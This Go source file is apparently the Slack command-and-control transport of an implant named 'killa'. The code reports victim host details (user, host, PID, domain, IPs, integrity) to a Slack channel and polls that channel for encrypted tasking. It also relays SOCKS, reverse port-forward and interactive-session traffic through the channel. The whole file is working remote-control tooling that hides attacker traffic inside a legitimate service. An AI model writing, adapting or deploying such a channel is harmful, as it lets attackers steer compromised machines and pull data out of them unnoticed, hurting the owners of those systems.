package slack

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"sort"
	"strings"
	"time"

	"killa/pkg/commands"
	"killa/pkg/structs"
	"github.com/slack-go/slack"
)

const (
	inboundPrefix  = "FWK_IN:"
	outboundPrefix = "FWK_OUT:"
)

type SlackProfile struct {
	BotToken      string
	ChannelID     string
	EncryptionKey string
	Debug         bool
	CallbackUUID  string
	PollInterval  time.Duration
	client        *slack.Client
	lastTs        string

	GetDelegatesOnly       func() []structs.DelegateMessage
	GetDelegatesAndEdges   func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage)
	HandleDelegates        func(delegates []structs.DelegateMessage)
	GetRpfwdOutbound       func() []structs.SocksMsg
	HandleRpfwd            func(msgs []structs.SocksMsg)
	GetInteractiveOutbound func() []structs.InteractiveMsg
	HandleInteractive      func(msgs []structs.InteractiveMsg)
}

func NewSlackProfile(botToken, channelID, encryptionKey string, pollIntervalSeconds int, debug bool) *SlackProfile {
	if pollIntervalSeconds <= 0 {
		pollIntervalSeconds = 5
	}
	return &SlackProfile{BotToken: botToken, ChannelID: channelID, EncryptionKey: encryptionKey, Debug: debug, PollInterval: time.Duration(pollIntervalSeconds) * time.Second, client: slack.New(botToken)}
}

func (s *SlackProfile) Checkin(agent *structs.Agent) error {
	checkinMsg := structs.CheckinMessage{Action: "checkin", PayloadUUID: agent.PayloadUUID, User: agent.User, Host: agent.Host, PID: agent.PID, OS: agent.OS, Architecture: agent.Architecture, Domain: agent.Domain, IPs: []string{agent.InternalIP}, ExternalIP: agent.ExternalIP, ProcessName: agent.ProcessName, Integrity: agent.Integrity}
	resp, err := s.sendAndPoll(agent.PayloadUUID, checkinMsg, 20*time.Second)
	if err != nil {
		s.CallbackUUID = agent.PayloadUUID
		return fmt.Errorf("slack checkin send/poll failed: %w", err)
	}
	var parsed map[string]any
	if err := json.Unmarshal(resp, &parsed); err != nil {
		s.CallbackUUID = agent.PayloadUUID
		return fmt.Errorf("slack checkin decode failed: %w", err)
	}
	if v, ok := parsed["id"].(string); ok && v != "" {
		s.CallbackUUID = v
	} else if v, ok := parsed["uuid"].(string); ok && v != "" {
		s.CallbackUUID = v
	} else {
		s.CallbackUUID = agent.PayloadUUID
	}
	return nil
}

func (s *SlackProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
	msg := structs.TaskingMessage{Action: "get_tasking", TaskingSize: -1, Socks: outboundSocks, PayloadUUID: s.getActiveUUID(agent), PayloadType: "killa", C2Profile: "slack"}
	if s.GetDelegatesOnly != nil {
		if delegates := s.GetDelegatesOnly(); len(delegates) > 0 {
			msg.Delegates = delegates
		}
	}
	if s.GetRpfwdOutbound != nil {
		if rpfwdMsgs := s.GetRpfwdOutbound(); len(rpfwdMsgs) > 0 {
			msg.Rpfwd = rpfwdMsgs
		}
	}
	if s.GetInteractiveOutbound != nil {
		if interactiveMsgs := s.GetInteractiveOutbound(); len(interactiveMsgs) > 0 {
			msg.Interactive = interactiveMsgs
		}
	}
	resp, err := s.sendAndPoll(s.getActiveUUID(agent), msg, 10*time.Second)
	if err != nil {
		return nil, nil, fmt.Errorf("slack get_tasking send/poll failed: %w", err)
	}
	var m map[string]any
	if err := json.Unmarshal(resp, &m); err != nil {
		return nil, nil, fmt.Errorf("slack get_tasking decode failed: %w", err)
	}
	var tasks []structs.Task
	if taskList, ok := m["tasks"].([]any); ok {
		for _, t := range taskList {
			if taskMap, ok := t.(map[string]any); ok {
				tasks = append(tasks, structs.NewTask(getString(taskMap, "id"), getString(taskMap, "command"), getString(taskMap, "parameters")))
			}
		}
	}
	var inboundSocks []structs.SocksMsg
	if socksList, exists := m["socks"]; exists {
		if socksRaw, err := json.Marshal(socksList); err == nil {
			_ = json.Unmarshal(socksRaw, &inboundSocks)
		}
	}
	s.routeInboundMessages(m)
	return tasks, inboundSocks, nil
}

func (s *SlackProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
	msg := structs.PostResponseMessage{Action: "post_response", Responses: []structs.Response{response}, Socks: socks}
	if s.GetRpfwdOutbound != nil {
		if rpfwdMsgs := s.GetRpfwdOutbound(); len(rpfwdMsgs) > 0 {
			msg.Rpfwd = rpfwdMsgs
		}
	}
	if s.GetDelegatesAndEdges != nil {
		delegates, edges := s.GetDelegatesAndEdges()
		if len(delegates) > 0 {
			msg.Delegates = delegates
		}
		if len(edges) > 0 {
			msg.Edges = edges
		}
	}
	if s.GetInteractiveOutbound != nil {
		if interactiveMsgs := s.GetInteractiveOutbound(); len(interactiveMsgs) > 0 {
			msg.Interactive = interactiveMsgs
		}
	}
	resp, err := s.sendAndPoll(s.getActiveUUID(agent), msg, 5*time.Second)
	if err != nil {
		return nil, err
	}
	var parsed map[string]any
	if err := json.Unmarshal(resp, &parsed); err == nil {
		s.routeInboundMessages(parsed)
	}
	return resp, nil
}

func (s *SlackProfile) GetCallbackUUID() string { return s.CallbackUUID }

func (s *SlackProfile) sendAndPoll(activeUUID string, msg any, waitFor time.Duration) ([]byte, error) {
	body, err := json.Marshal(msg)
	if err != nil {
		return nil, fmt.Errorf("marshal slack message: %w", err)
	}
	payload, err := s.encodeEnvelope(activeUUID, body)
	if err != nil {
		return nil, err
	}
	if _, _, err := s.client.PostMessage(s.ChannelID, slack.MsgOptionText(outboundPrefix+payload, false)); err != nil {
		return nil, fmt.Errorf("post slack message: %w", err)
	}
	deadline := time.Now().Add(waitFor)
	var lastPollErr error
	for time.Now().Before(deadline) {
		decoded, found, err := s.pollInboundEnvelope()
		if err != nil {
			lastPollErr = err
		}
		if err == nil && found {
			return decoded, nil
		}
		commands.AgentSleep(s.PollInterval)
	}
	if lastPollErr != nil {
		return nil, fmt.Errorf("no inbound Slack response: last poll error: %w", lastPollErr)
	}
	return nil, fmt.Errorf("no inbound Slack response")
}

func (s *SlackProfile) pollInboundEnvelope() ([]byte, bool, error) {
	params := &slack.GetConversationHistoryParameters{ChannelID: s.ChannelID, Limit: 25, Inclusive: false, Oldest: s.lastTs}
	history, err := s.client.GetConversationHistory(params)
	if err != nil {
		return nil, false, err
	}
	if len(history.Messages) == 0 {
		return nil, false, nil
	}
	sort.Slice(history.Messages, func(i, j int) bool { return history.Messages[i].Timestamp < history.Messages[j].Timestamp })
	for _, msg := range history.Messages {
		if msg.Timestamp > s.lastTs {
			s.lastTs = msg.Timestamp
		}
		if !strings.HasPrefix(msg.Text, inboundPrefix) {
			continue
		}
		encoded := strings.TrimSpace(strings.TrimPrefix(msg.Text, inboundPrefix))
		decoded, err := s.decodeEnvelope(encoded)
		if err != nil {
			continue
		}
		return decoded, true, nil
	}
	return nil, false, nil
}

func (s *SlackProfile) getActiveUUID(agent *structs.Agent) string {
	if s.CallbackUUID != "" {
		return s.CallbackUUID
	}
	return agent.PayloadUUID
}

func (s *SlackProfile) routeInboundMessages(m map[string]any) {
	if s.HandleRpfwd != nil {
		if rpfwdList, exists := m["rpfwd"]; exists {
			if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
				var rpfwdMsgs []structs.SocksMsg
				if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
					s.HandleRpfwd(rpfwdMsgs)
				}
			}
		}
	}
	if s.HandleInteractive != nil {
		if interactiveList, exists := m["interactive"]; exists {
			if interactiveRaw, err := json.Marshal(interactiveList); err == nil {
				var interactiveMsgs []structs.InteractiveMsg
				if err := json.Unmarshal(interactiveRaw, &interactiveMsgs); err == nil && len(interactiveMsgs) > 0 {
					s.HandleInteractive(interactiveMsgs)
				}
			}
		}
	}
	if s.HandleDelegates != nil {
		if delegateList, exists := m["delegates"]; exists {
			if delegateRaw, err := json.Marshal(delegateList); err == nil {
				var delegates []structs.DelegateMessage
				if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
					s.HandleDelegates(delegates)
				}
			}
		}
	}
}

func (s *SlackProfile) encodeEnvelope(activeUUID string, data []byte) (string, error) {
	if s.EncryptionKey != "" {
		var err error
		data, err = s.encryptMessage(data)
		if err != nil {
			return "", err
		}
	}
	messageData := append([]byte(activeUUID), data...)
	return base64.StdEncoding.EncodeToString(messageData), nil
}

func (s *SlackProfile) decodeEnvelope(encoded string) ([]byte, error) {
	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}
	if s.EncryptionKey == "" {
		if len(decoded) <= 36 {
			return nil, fmt.Errorf("decoded slack message too short")
		}
		return decoded[36:], nil
	}
	return s.decryptResponse(decoded)
}

func (s *SlackProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
	key, err := base64.StdEncoding.DecodeString(s.EncryptionKey)
	if err != nil {
		return nil, err
	}
	if len(encryptedData) < 36+16+32 {
		return nil, fmt.Errorf("encrypted data too short")
	}
	iv := encryptedData[36 : 36+aes.BlockSize]
	ciphertextWithHMAC := encryptedData[36+aes.BlockSize:]
	if len(ciphertextWithHMAC) < 32 {
		return nil, fmt.Errorf("invalid encrypted data")
	}
	ciphertext := ciphertextWithHMAC[:len(ciphertextWithHMAC)-32]
	receivedHMAC := ciphertextWithHMAC[len(ciphertextWithHMAC)-32:]
	h := hmac.New(sha256.New, key)
	h.Write(append(iv, ciphertext...))
	if !hmac.Equal(receivedHMAC, h.Sum(nil)) {
		return nil, fmt.Errorf("hmac verification failed")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	if len(ciphertext)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("invalid ciphertext length")
	}
	decrypted := make([]byte, len(ciphertext))
	cipher.NewCBCDecrypter(block, iv).CryptBlocks(decrypted, ciphertext)
	padLen := int(decrypted[len(decrypted)-1])
	if padLen == 0 || padLen > aes.BlockSize || padLen > len(decrypted) {
		return nil, fmt.Errorf("invalid padding")
	}
	for _, b := range decrypted[len(decrypted)-padLen:] {
		if int(b) != padLen {
			return nil, fmt.Errorf("invalid padding bytes")
		}
	}
	return decrypted[:len(decrypted)-padLen], nil
}

func (s *SlackProfile) encryptMessage(msg []byte) ([]byte, error) {
	key, err := base64.StdEncoding.DecodeString(s.EncryptionKey)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}
	padded, err := pkcs7Pad(msg, aes.BlockSize)
	if err != nil {
		return nil, err
	}
	encrypted := make([]byte, len(padded))
	cipher.NewCBCEncrypter(block, iv).CryptBlocks(encrypted, padded)
	ivCiphertext := append(iv, encrypted...)
	h := hmac.New(sha256.New, key)
	h.Write(ivCiphertext)
	return append(ivCiphertext, h.Sum(nil)...), nil
}

func pkcs7Pad(data []byte, blockSize int) ([]byte, error) {
	if blockSize <= 0 || len(data) == 0 {
		return nil, fmt.Errorf("invalid padding input")
	}
	padding := blockSize - len(data)%blockSize
	return append(data, bytes.Repeat([]byte{byte(padding)}, padding)...), nil
}

func getString(m map[string]any, key string) string {
	if v, ok := m[key].(string); ok {
		return v
	}
	return ""
}
